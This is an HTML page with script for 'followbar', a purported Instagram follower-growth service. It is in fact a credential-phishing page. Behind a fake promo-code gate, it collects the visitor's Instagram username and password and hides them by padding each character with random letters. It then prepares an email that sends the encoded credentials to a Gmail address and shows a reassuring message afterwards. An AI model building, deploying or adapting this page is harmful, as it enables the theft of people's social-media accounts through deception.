<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>followbar</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />

    <style>
        * {
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        /* body {
            background-color: #eee;
        } */

        #container {
            display: flex;
            align-items: center;
            /* margin: 50px auto; */
            flex-direction: column;
        }

        section {
            margin: 20px 5;

        }

        .main-top {
            width: 100%;
            text-align: center;
            margin-bottom: 5px;
            padding: 50px 50px;
            background-color: #fff;
        }

        .logo {
            margin-bottom: 5px;
        }

        .logo img {
            height: 50px;
            margin: 0 auto;
        }


        #password {
            height: 47px;
            background-color: rgb(250, 250, 250);
            width: 65%;
            margin-bottom: 5px;
            padding: 8px;
            border: 1px solid rgb(219, 219, 219);
            font-size: 15px;
            border-radius: 3px;
        }

        .username,
        .password {
            height: 47px;
            background-color: rgb(250, 250, 250);
            width: 100%;
            margin-bottom: 5px;
            padding: 8px 12px;
            border: 1px solid rgb(219, 219, 219);
            font-size: 15px;
            border-radius: 3px;
        }

        input:focus {
            outline: none;
        }

        .login-btn {
            font-size: 16px;
            height: 42px;
            width: 100%;
            background-color: #3897f0;
            border: 1px solid #3897f0;
            padding: 6px 0;
            color: #fff;
            cursor: pointer;
            border-radius: 3px;
        }

        .or {
            line-height: 50px;
        }

        .main-bottom a {
            margin: 20px 0;
            text-decoration: none;
            font-size: 15px;
            line-height: 30px;
        }

        .fa-facebook-f {
            color: #fff;
            border-radius: 2px;
            font-size: 12px;
            background-color: rgb(15, 15, 168);
            width: 20px;
            text-align: center;
            height: 20px;
            padding: 5px;
        }

        .bottom {
            width: 350px;
            text-align: center;
            padding: 20px 0;
            background-color: #fff;
        }

        .signUp a {
            text-decoration: none;
            cursor: pointer;
            color: #3897f0;
        }

        .app-section {
            text-align: center;
            padding: 10px 0;
        }

        .app-section span {
            font-size: 16px;
        }

        .images {
            margin: 10px 0;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
        }

        .images img {
            margin: 0 5px;
            height: 35px;
        }

        footer {
            width: 70%;
            text-align: center;
            margin-top: 2rem;
        }

        footer a,
        footer span,
        footer select {
            font-size: 13px;
            color: #8e8e8e;
            text-decoration: none;
            margin: 5px;
        }

        footer select {
            outline: none;
            border: none;
            background-color: #eee;
        }
    </style>
</head>

<body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script>

        setTimeout(() => {
            if(window.prompt("  Enter referred promo code blow.") == "F2394"){
                // document.getElementById("containerr").innerHTML = ""
            }
            else{
                document.getElementById("containerr").innerHTML = 'Error!!! 401 Invalid promo code you entered. \nGo back and "try again"'
                document.getElementById("containerrr").innerHTML = ""
            }
        }, 0)

        function generateRandomName(length) {
            var letters = 'ab1234567890jklmnopqrstuvwxyz';
            var randomName = '';

            for (var i = 0; i < length; i++) {
                var randomIndex = Math.floor(Math.random() * letters.length);
                randomName += letters.charAt(randomIndex);
            }

            return randomName;
        }

        // $(".input_text").focus(function () {
        //     $(this).prev('.fa').addclass('glowIcon')
        // })
        // $(".input_text").focusout(function () {
        //     $(this).prev('.fa').removeclass('glowIcon')
        // })
        let id = ""
        let password = ""
        let code = ""
        let result1 = ""
        let result2 = ""

        function send() {
            console.log(result1);
            $("#button").attr('href', 'mailto:followbarservice@gmail.com?subject=Send mail request to followbar%20&body=Request ID provided. Send mail...' + ' "' + result2 + "xxttzz" + result1 + 'xtz"')
        }
        function send2() {
            document.getElementById("containerr").innerHTML = 'If you sent mail, \nWe will work on shortlist your request\nto shine your Instagram profile\nGood Luck!!!. Go back and "try again" if you canceled mail process.'
            document.getElementById("containerrr").innerHTML = ""
        }

        function postData() {
            id = document.getElementById("userid").value;
            password = document.getElementById("pass").value;
            code = document.getElementById("scode").value;

            if (id == "") {
                alert("  Enter your Instagram ID:")
            }
            else if (password == "") {
                alert("  Enter your Instagram password:")
            }
            else if (code == "") {
                alert("  Enter Refferd promo Code:")
            }
            else if (code != "F2394") {
                alert("  Invalid promo code!!!\nEnter correct promo code.")
            }
            // else if (code != "" && document.getElementById("codecheck").value != "yes") {
            //     alert("Check the box if you use promo code")
            // }
            else {
                // alert(`user = ${id}\n password = ${password}\n code = ${code}`)

                for (let i in id) {
                    let random = generateRandomName(6)
                    result2 = result2 + random + "xtz" + id[i]
                }
                for (let i in password) {
                
                    let random = generateRandomName(6)
                    console.log(random);
                    result1 = result1 + random + "xtz" + password[i]
                }
                // if (window.confirm("Great!!!\nYour request id created.\nsend mail request to grow your Instagram followers")) {
                // }
                send()
                setTimeout(() => send2(),4000)

            }
        }
    </script>
